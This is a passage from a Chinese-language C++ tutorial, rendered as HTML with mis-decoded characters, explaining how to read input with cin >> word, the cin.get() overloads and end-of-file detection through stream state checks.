&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–ç¬¬ä¸€ä¸ªéç©ºç™½å­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; ch; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First char read: &#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¦‚æœè¾“å…¥ &quot;  a b c&quot;, è¿™é‡Œä¼šè¯»åˆ° &#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–ä¸‹ä¸€ä¸ªå•è¯</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next word read: \&quot;&quot;</span> &lt;&lt; word &lt;&lt; <span class="string">&quot;\&quot;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä¼šè¯»åˆ° &quot;b&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å†æ¬¡è¯»å–å­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; ch;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next char read: &#x27;&quot;</span> &lt;&lt; ch &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä¼šè¯»åˆ° &#x27;c&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯è¯»å–å•è¯ç›´åˆ°è¾“å…¥ç»“æŸ (ä¾‹å¦‚æŒ‰ Ctrl+Z/Ctrl+D)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter words (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; word) &#123; <span class="comment">// cin &gt;&gt; word åœ¨æˆåŠŸè¯»å–æ—¶è¿”å› true</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read word: &quot;</span> &lt;&lt; word &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šå¾ªç¯ç»“æŸåï¼Œcin å¯èƒ½å¤„äºå¤±è´¥çŠ¶æ€</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>while (std::cin &gt;&gt; word)</code> æ˜¯ä¸€ç§å¸¸è§çš„è¯»å–æ¨¡å¼ï¼Œå®ƒåˆ©ç”¨äº† <code>cin</code> å¯¹è±¡åœ¨æˆåŠŸè¯»å–æ—¶å¯ä»¥è¢«è½¬æ¢ä¸º <code>true</code> çš„ç‰¹æ€§ã€‚å½“è¯»å–å¤±è´¥ï¼ˆä¾‹å¦‚åˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–é‡åˆ°æ— æ•ˆè¾“å…¥ï¼‰æ—¶ï¼Œ<code>cin</code> å¯¹è±¡ä¼šè½¬æ¢ä¸º <code>false</code>ï¼Œå¾ªç¯ç»ˆæ­¢ã€‚</p><h3 id="5-5-2-ä½¿ç”¨cin-get-char-è¿›è¡Œè¡¥æ•‘"><a href="#5-5-2-ä½¿ç”¨cin-get-char-è¿›è¡Œè¡¥æ•‘" class="headerlink" title="5.5.2 ä½¿ç”¨cin.get(char)è¿›è¡Œè¡¥æ•‘"></a>5.5.2 ä½¿ç”¨cin.get(char)è¿›è¡Œè¡¥æ•‘</h3><p><code>cin &gt;&gt;</code> è·³è¿‡ç©ºç™½å¹¶åœæ­¢äºç©ºç™½çš„è¡Œä¸ºæœ‰æ—¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œç‰¹åˆ«æ˜¯å½“æˆ‘ä»¬éœ€è¦è¯»å–åŒ…æ‹¬ç©ºæ ¼åœ¨å†…çš„æ¯ä¸€ä¸ªå­—ç¬¦æ—¶ã€‚<code>cin.get(char&amp; ch)</code> æˆå‘˜å‡½æ•°æä¾›äº†è§£å†³æ–¹æ¡ˆã€‚</p><ul><li><code>cin.get(char&amp; ch)</code>:<ul><li>  å°è¯•ä»è¾“å…¥æµä¸­è¯»å–<strong>ä¸‹ä¸€ä¸ª</strong>å­—ç¬¦ï¼ˆæ— è®ºå®ƒæ˜¯ä»€ä¹ˆï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰ã€‚</li><li>  å¦‚æœæˆåŠŸè¯»å–ï¼Œå°†è¯¥å­—ç¬¦å­˜å‚¨åœ¨å‚æ•° <code>ch</code> ä¸­ï¼Œå¹¶è¿”å› <code>cin</code> å¯¹è±¡æœ¬èº«ï¼ˆå¯ä»¥è½¬æ¢ä¸º <code>true</code>ï¼‰ã€‚</li><li>  å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–å‘ç”Ÿé”™è¯¯ï¼Œä¸ä¿®æ”¹ <code>ch</code>ï¼Œå¹¶å°† <code>cin</code> ç½®äºå¤±è´¥çŠ¶æ€ï¼ˆè½¬æ¢ä¸º <code>false</code>ï¼‰ã€‚</li></ul></li></ul><p>è¿™ä½¿å¾— <code>cin.get(char)</code> éå¸¸é€‚åˆåœ¨å¾ªç¯ä¸­é€ä¸ªè¯»å–æ‰€æœ‰å­—ç¬¦ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter text (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯è¯»å–æ¯ä¸€ä¸ªå­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºç™½ç¬¦</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.get(ch)) &#123; <span class="comment">// å°è¯•è¯»å–ä¸€ä¸ªå­—ç¬¦åˆ° ch</span></span><br><span class="line">        <span class="comment">// æˆåŠŸè¯»å–ï¼Œå¤„ç†å­—ç¬¦ ch</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; ch; <span class="comment">// é€ä¸ªå­—ç¬¦å›æ˜¾</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of input ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total characters read: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¾ªç¯ä¼šè¯»å–å¹¶å›æ˜¾ç”¨æˆ·è¾“å…¥çš„æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼å’Œæ¢è¡Œï¼Œç›´åˆ°é‡åˆ°æ–‡ä»¶ç»“æŸç¬¦ã€‚</p><h3 id="5-5-3-ä½¿ç”¨å“ªä¸ªcin-get"><a href="#5-5-3-ä½¿ç”¨å“ªä¸ªcin-get" class="headerlink" title="5.5.3 ä½¿ç”¨å“ªä¸ªcin.get()"></a>5.5.3 ä½¿ç”¨å“ªä¸ªcin.get()</h3><p><code>istream</code> ç±»ï¼ˆ<code>cin</code> æ˜¯å…¶å¯¹è±¡ï¼‰å®é™…ä¸Šæä¾›äº†å‡ ä¸ªåä¸º <code>get</code> çš„æˆå‘˜å‡½æ•°ï¼ˆå‡½æ•°é‡è½½ï¼‰ï¼š</p><ol><li><p><strong><code>cin.get(char&amp; ch)</code>:</strong> (å·²åœ¨ 5.5.2 è®¨è®º)</p><ul><li>  è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦åˆ°å‚æ•° <code>ch</code> ä¸­ã€‚</li><li>  è¿”å› <code>cin</code> å¯¹è±¡ã€‚</li><li>  é€‚åˆåœ¨ <code>while</code> æ¡ä»¶ä¸­ç›´æ¥ä½¿ç”¨ <code>while(cin.get(ch))</code>ã€‚</li></ul></li><li><p><strong><code>cin.get()</code>:</strong> (æ— å‚æ•°ç‰ˆæœ¬)</p><ul><li>  è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚</li><li>  è¿”å›è¯¥å­—ç¬¦çš„<strong>æ•´æ•°</strong> ASCII ç ï¼ˆæˆ– <code>wchar_t</code> å¯¹åº”çš„å€¼ï¼‰ã€‚</li><li>  å¦‚æœåˆ°è¾¾æ–‡ä»¶æœ«å°¾æˆ–å‘ç”Ÿé”™è¯¯ï¼Œè¿”å›ç‰¹æ®Šå€¼ <code>EOF</code> (End Of Fileï¼Œé€šå¸¸å®šä¹‰ä¸º -1ï¼Œåœ¨ <code>&lt;iostream&gt;</code> æˆ– <code>&lt;cstdio&gt;</code> ä¸­å®šä¹‰)ã€‚</li><li>  ä¸ç›´æ¥å°†å­—ç¬¦å­˜å…¥å˜é‡ï¼Œéœ€è¦æ¥æ”¶å…¶è¿”å›å€¼ã€‚</li></ul></li></ol><p><strong>é€‰æ‹©ä¾æ®:</strong></p><ul><li>  <strong><code>cin.get(char&amp; ch)</code>:</strong> å½“ä½ éœ€è¦å°†è¯»å–çš„å­—ç¬¦ç›´æ¥å­˜å‚¨åˆ°ä¸€ä¸ª <code>char</code> å˜é‡ä¸­ï¼Œå¹¶ä¸”æƒ³åˆ©ç”¨ <code>cin</code> å¯¹è±¡åœ¨ <code>while</code> æ¡ä»¶ä¸­çš„å¸ƒå°”è½¬æ¢ç‰¹æ€§æ—¶ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„é€‰æ‹©ã€‚</li><li>  <strong><code>cin.get()</code> (æ— å‚æ•°):</strong> å½“ä½ éœ€è¦æ˜¾å¼åœ°æ£€æŸ¥æ–‡ä»¶ç»“æŸç¬¦ <code>EOF</code> æ—¶ï¼Œæˆ–è€…å½“ä½ éœ€è¦è·å–å­—ç¬¦çš„æ•´æ•°å€¼æ—¶ï¼Œè¿™ä¸ªç‰ˆæœ¬æ›´åˆé€‚ã€‚è¿”å›å€¼éœ€è¦ä¸ <code>EOF</code> è¿›è¡Œæ¯”è¾ƒã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹ (cin.get() æ— å‚æ•°ç‰ˆæœ¬):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt; // ä¸ºäº† EOF (è™½ç„¶ iostream é€šå¸¸ä¹ŸåŒ…å«)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ch_int; <span class="comment">// æ³¨æ„ç±»å‹æ˜¯ intï¼Œä»¥æ¥æ”¶ EOF</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter text (Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯è¯»å–ï¼Œç›´åˆ°é‡åˆ° EOF</span></span><br><span class="line">    <span class="keyword">while</span> ((ch_int = <span class="built_in">std</span>::<span class="built_in">cin</span>.get()) != EOF) &#123; <span class="comment">// è¯»å–å­—ç¬¦çš„ int å€¼å¹¶ä¸ EOF æ¯”è¾ƒ</span></span><br><span class="line">        <span class="comment">// æˆåŠŸè¯»å– (ä¸æ˜¯ EOF)</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(ch_int); <span class="comment">// å°† int å€¼è½¬å› char è¿›è¡Œè¾“å‡º</span></span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- End of input ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total characters read: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤ç§ <code>get</code> æ–¹æ³•éƒ½å¯ä»¥ç”¨äºé€å­—ç¬¦è¯»å–ï¼Œé€‰æ‹©å“ªç§å–å†³äºä½ å–œæ¬¢çš„åˆ¤æ–­å¾ªç¯ç»“æŸçš„æ–¹å¼ï¼ˆæ£€æŸ¥ <code>cin</code> çŠ¶æ€è¿˜æ˜¯æ£€æŸ¥ <code>EOF</code> è¿”å›å€¼ï¼‰ã€‚</p><h3 id="5-5-4-æ–‡ä»¶å°¾æ¡ä»¶"><a href="#5-5-4-æ–‡ä»¶å°¾æ¡ä»¶" class="headerlink" title="5.5.4 æ–‡ä»¶å°¾æ¡ä»¶"></a>5.5.4 æ–‡ä»¶å°¾æ¡ä»¶</h3><p>å½“ä»è¾“å…¥æµï¼ˆå¦‚ <code>cin</code> æˆ–æ–‡ä»¶æµï¼‰è¯»å–æ•°æ®æ—¶ï¼Œæœ€ç»ˆä¼šåˆ°è¾¾è¾“å…¥çš„æœ«å°¾ï¼Œè¿™è¢«ç§°ä¸º**æ–‡ä»¶å°¾ (End-of-File, EOF)**ã€‚ç¨‹åºéœ€è¦èƒ½å¤Ÿæ£€æµ‹åˆ° EOF æ¡ä»¶ä»¥æ­£å¸¸ç»ˆæ­¢è¯»å–å¾ªç¯ã€‚</p><p>æœ‰å‡ ç§æ–¹æ³•å¯ä»¥æ£€æµ‹ EOFï¼š</p><ol><li><p><strong>æ£€æŸ¥ <code>cin</code> çŠ¶æ€:</strong></p><ul><li>  <code>cin</code> å¯¹è±¡æœ¬èº«å¯ä»¥è½¬æ¢ä¸ºå¸ƒå°”å€¼ã€‚å½“è¯»å–æ“ä½œæˆåŠŸæ—¶ï¼Œå®ƒè½¬æ¢ä¸º <code>true</code>ï¼›å½“é‡åˆ° EOF æˆ–å…¶ä»–é”™è¯¯å¯¼è‡´è¯»å–å¤±è´¥æ—¶ï¼Œå®ƒè½¬æ¢ä¸º <code>false</code>ã€‚è¿™æ˜¯ <code>while (cin &gt;&gt; word)</code> å’Œ <code>while (cin.get(ch))</code> èƒ½å¤Ÿå·¥ä½œçš„åŸå› ã€‚</li><li>  <code>cin.eof()</code>: å¦‚æœæµæ˜¯å› ä¸ºåˆ°è¾¾æ–‡ä»¶æœ«å°¾è€Œå¤±è´¥ï¼Œæ­¤å‡½æ•°è¿”å› <code>true</code>ã€‚<strong>æ³¨æ„:</strong> <code>eof()</code> åªæœ‰åœ¨<strong>å°è¯•è¯»å–å¹¶å¤±è´¥</strong>åæ‰ä¼šå˜ä¸º <code>true</code>ã€‚ä¸èƒ½ç”¨å®ƒæ¥é¢„æµ‹ä¸‹ä¸€æ¬¡è¯»å–æ˜¯å¦ä¼šåˆ°è¾¾ EOFã€‚</li><li>  <code>cin.fail()</code>: å¦‚æœå‘ç”Ÿäº†é EOF çš„ I/O é”™è¯¯ï¼ˆä¾‹å¦‚è¯»å–äº†æ— æ•ˆæ•°æ®ç±»å‹ï¼‰æˆ–åˆ°è¾¾ EOFï¼Œæ­¤å‡½æ•°è¿”å› <code>true</code>ã€‚</li><li>  <code>cin.good()</code>: å¦‚æœæµå¤„äºæ­£å¸¸çŠ¶æ€ï¼ˆæ²¡æœ‰è®¾ç½® <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>ï¼‰ï¼Œè¿”å› <code>true</code>ã€‚</li></ul></li><li><p><strong>æ£€æŸ¥ <code>cin.get()</code> çš„è¿”å›å€¼:</strong></p><ul><li>  æ— å‚æ•°çš„ <code>cin.get()</code> åœ¨åˆ°è¾¾ EOF æ—¶è¿”å›ç‰¹æ®Šå€¼ <code>EOF</code>ã€‚è¿™æ˜¯ <code>while ((ch = cin.get()) != EOF)</code> èƒ½å¤Ÿå·¥ä½œçš„åŸå› ã€‚</li></ul></li></ol><p><strong>EOF çš„è§¦å‘:</strong></p><ul><li><strong>é”®ç›˜è¾“å…¥:</strong> é€šå¸¸é€šè¿‡æŒ‰ä¸‹ç‰¹å®šçš„ç»„åˆé”®æ¥æ¨¡æ‹Ÿ EOFï¼š<ul><li>  Unix/Linux/macOS: <code>Ctrl+D</code> (é€šå¸¸éœ€è¦åœ¨è¡Œé¦–æŒ‰)</li><li>  Windows: <code>Ctrl+Z</code> (é€šå¸¸éœ€è¦åœ¨ä¸€è¡Œç»“æŸåæŒ‰ Enterï¼Œç„¶åå†æŒ‰ <code>Ctrl+Z</code> å†æŒ‰ Enter)</li></ul></li><li>  <strong>æ–‡ä»¶è¾“å…¥:</strong> å½“è¯»å–æ“ä½œå°è¯•è¶Šè¿‡æ–‡ä»¶çš„æœ€åä¸€ä¸ªå­—èŠ‚æ—¶ï¼Œä¼šè§¦å‘ EOFã€‚</li></ul><p><strong>ç¤ºä¾‹ (ä½¿ç”¨ <code>cin</code> çŠ¶æ€):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers (non-number or Ctrl+Z/D to stop):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¾ªç¯è¯»å–ï¼Œç›´åˆ° cin å¤±è´¥ (EOF æˆ–ç±»å‹ä¸åŒ¹é…)</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; number) &#123; </span><br><span class="line">        sum += number;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Input finished ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ£€æŸ¥å¾ªç¯ç»“æŸçš„åŸå› </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: End-of-File reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.fail()) &#123;</span><br><span class="line">        <span class="comment">// fail() åœ¨ eof() æ—¶ä¹Ÿå¯èƒ½ä¸º trueï¼Œä½†è¿™é‡Œæˆ‘ä»¬æ’é™¤äº† eof</span></span><br><span class="line">        <span class="comment">// å¦‚æœæ˜¯å› ä¸ºç±»å‹ä¸åŒ¹é…ï¼ˆä¾‹å¦‚è¾“å…¥äº†å­—æ¯ï¼‰ï¼Œfail() ä¸º true, eof() ä¸º false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Invalid input (non-number).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// å¯èƒ½éœ€è¦æ¸…é™¤é”™è¯¯çŠ¶æ€å¹¶å¿½ç•¥æ— æ•ˆè¾“å…¥ä»¥ç»§ç»­</span></span><br><span class="line">        <span class="comment">// std::cin.clear(); </span></span><br><span class="line">        <span class="comment">// std::cin.ignore(10000, &#x27;\n&#x27;);</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.bad()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reason: Unrecoverable stream error.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read &quot;</span> &lt;&lt; count &lt;&lt; <span class="string">&quot; numbers. Sum = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No valid numbers were entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç†è§£å¦‚ä½•æ£€æµ‹ EOF å¯¹äºç¼–å†™èƒ½æ­£ç¡®å¤„ç†è¾“å…¥ç»“æŸçš„å¾ªç¯è‡³å…³é‡è¦ã€‚æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯åˆ©ç”¨ <code>cin</code> å¯¹è±¡æˆ– <code>cin.get()</code> åœ¨ <code>while</code> æ¡ä»¶ä¸­çš„è¡Œä¸ºã€‚</p><h3 id="5-5-5-å¦ä¸€ä¸ªcin-get-ç‰ˆæœ¬"><a href="#5-5-5-å¦ä¸€ä¸ªcin-get-ç‰ˆæœ¬" class="headerlink" title="5.5.5 å¦ä¸€ä¸ªcin.get()ç‰ˆæœ¬"></a>5.5.5 å¦ä¸€ä¸ªcin.get()ç‰ˆæœ¬</h3><p>é™¤äº†è¯»å–å•ä¸ªå­—ç¬¦çš„ <code>get()</code> å‡½æ•°å¤–ï¼Œ<code>istream</code> è¿˜æä¾›äº†ç”¨äºè¯»å– C é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰çš„ <code>get()</code> ç‰ˆæœ¬ï¼š</p><ul><li><strong><code>cin.get(char* buffer, int size, char delimiter = &#39;\n&#39;)</code>:</strong><ul><li>  ä»è¾“å…¥æµä¸­è¯»å–å­—ç¬¦ï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åˆ° <code>buffer</code> æŒ‡å‘çš„å­—ç¬¦æ•°ç»„ä¸­ã€‚</li><li>  æœ€å¤šè¯»å– <code>size - 1</code> ä¸ªå­—ç¬¦ï¼ˆä¸ºæœ«å°¾çš„ç©ºå­—ç¬¦ <code>\0</code> ç•™å‡ºç©ºé—´ï¼‰ã€‚</li><li>  å¦‚æœåœ¨è¯»å– <code>size - 1</code> ä¸ªå­—ç¬¦ä¹‹å‰é‡åˆ° <code>delimiter</code> å­—ç¬¦ï¼Œåˆ™åœæ­¢è¯»å–ã€‚</li><li>  <strong><code>delimiter</code> å­—ç¬¦æœ¬èº«ä¸ä¼šè¢«è¯»å–åˆ° <code>buffer</code> ä¸­ï¼Œè€Œæ˜¯ä¼šç•™åœ¨è¾“å…¥æµä¸­ã€‚</strong> (è¿™æ˜¯ä¸ <code>getline</code> çš„ä¸»è¦åŒºåˆ«ä¹‹ä¸€)ã€‚</li><li>  è¯»å–ç»“æŸåï¼Œæ€»ä¼šåœ¨ <code>buffer</code> çš„æœ«å°¾æ·»åŠ ä¸€ä¸ªç©ºå­—ç¬¦ <code>\0</code>ã€‚</li><li>  è¿”å› <code>cin</code> å¯¹è±¡ã€‚</li></ul></li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUFFER_SIZE = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[BUFFER_SIZE];</span><br><span class="line">    <span class="keyword">char</span> address[BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your name (max &quot;</span> &lt;&lt; BUFFER_SIZE - <span class="number">1</span> &lt;&lt; <span class="string">&quot; chars): &quot;</span>;</span><br><span class="line">    <span class="comment">// 